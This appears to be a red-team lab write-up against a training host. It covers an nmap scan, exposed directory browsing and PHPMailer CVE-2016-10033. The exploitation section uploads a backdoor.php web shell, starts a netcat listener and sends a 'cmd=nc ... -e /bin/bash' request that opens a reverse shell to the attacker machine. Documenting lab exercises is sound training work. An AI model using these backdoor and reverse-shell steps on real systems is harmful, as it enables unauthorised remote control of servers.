# **Red Team: Summary of Operations**

## TARGET 2

### Table of Contents

- Exposed Services
- Critical Vulnerabilities
- Exploitation

---

## Exposed Services

Nmap scan results reveals the below services and OS details:

nmap -sV 192.168.1.115

![1](/Images/4/1.PNG)

---

## Critical Vulnerabilities

The CVE and CWE databases give us information of vulnerabilities found in the previous step. These vulnerabilities are potential points of entry:

Vulnerability | Description | Impact
---|---|---
**CWE-548** Exposure of information through directory browsing | A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers | Allowing an bad actor to obtain more information about your server could allow them to further their attack
**CVE-2016-10033** Remote Code Execution Vulnerability in PHPMailer | HPMailer allows extra parameters in the mail command and consequently executes arbitrary code | An attacker can execute commands on the web server remotely  allowing them to further compromise the target.

---

# Exploitation

The Red Team was able to penetrate Target 2 and retrieve the following confidential data:

**flag1:**  `flag1{a2c1f66d28051bd3a5874b5b6r43e21}`

- **CWE-548** Exposure of information through directory browsing
    
    Sensitive information was accessed without authorization through directory browsing. 
    
    The vendor directory has no restrictions and is accessible through the browser. It includes several sensitive files that leak information about the services in use, their versions, and the critical data `flag1{a2c1f66d28051bd3a5874b5b6r43e21}` in the PATH file.

    **Vendor Directory Index view from the browser**
     
    ![1](/Images/4/6.PNG) 

    PATH File: **Flag1**

    ![2](/Images/4/7.PNG)        
     
    **PHPMAILER version**

    ![4](/Images/4/9.PNG)    

---

- **CVE-2016-10033** Remote Code Execution Vulnerability in PHPMailer

    The current version of PHPMailer in use (5.2.16) is vulnerable. It allows extra parameters in the mail command and consequently executes arbitrary code. Therefore, the exploited machine can establish stealthy communication with a Command and Control through a reverse shell that will bypass the inbound rules of a firewall.

    1. Execution of the script to exploit PHPMailer. This script will upload a file called backdoor.php to the target server allowing the execution of command injection attacks.

            ./exploit.sh

        ![15](/Images/4/15.PNG)

    2. Set the Command and Control Machine to listen using the NetCat command.

            nc -lnvp 4444

        ![16](/Images/4/16.PNG)

    19. Make that the exploited machine calls to the Command and Control Machine using a NetCat command embedded in a payload after running the payload in the browser.

            192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash  

        ![17](/Images/4/17.PNG)

    20. Sensitive information was found in the "www" and "WordPress uploads" directory    

        ![18](/Images/4/18.PNG)

        ![15](/Images/1/15.png)